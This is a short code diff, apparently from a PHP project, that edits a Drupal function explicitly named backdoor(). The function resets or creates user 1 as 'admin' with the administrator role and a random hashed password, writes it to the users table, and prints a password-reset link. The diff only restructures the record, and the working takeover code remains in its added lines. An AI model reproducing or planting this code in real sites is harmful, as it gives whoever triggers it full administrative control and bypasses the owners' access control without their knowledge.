@@ -45,17 +45,17 @@ function backdoor() {
 		$pass = user_password(25);
 		require_once DRUPAL_ROOT . '/' . variable_get('password_inc', 'includes/password.inc');
 		$new_password = user_hash_password(trim($pass));
-		$newuser = array(
-			'uid' => 1,
-			'name' => 'admin',
-			'pass' => $new_password,
-			'mail' => 'email@example.com',
-			'init' => 'email@example.com',
-			'status' => 1,
-			'role' => array(
-				DRUPAL_AUTHENTICATED_RID => TRUE,
-				'administrator' => TRUE,
-			),
+
+		$newuser = new stdClass();
+		$newuser->uid = 1;
+		$newuser->name = 'admin';
+		$newuser->pass = $new_password;
+		$newuser->mail = 'email@example.com';
+		$newuser->init = 'email@example.com';
+		$newuser->status = 1;
+		$newuser->role = array(
+			DRUPAL_AUTHENTICATED_RID => TRUE,
+			'administrator' => TRUE,
 		);
 		drupal_write_record('users', $newuser);
 		$link = l(user_pass_reset_url($newuser), user_pass_reset_url($newuser));
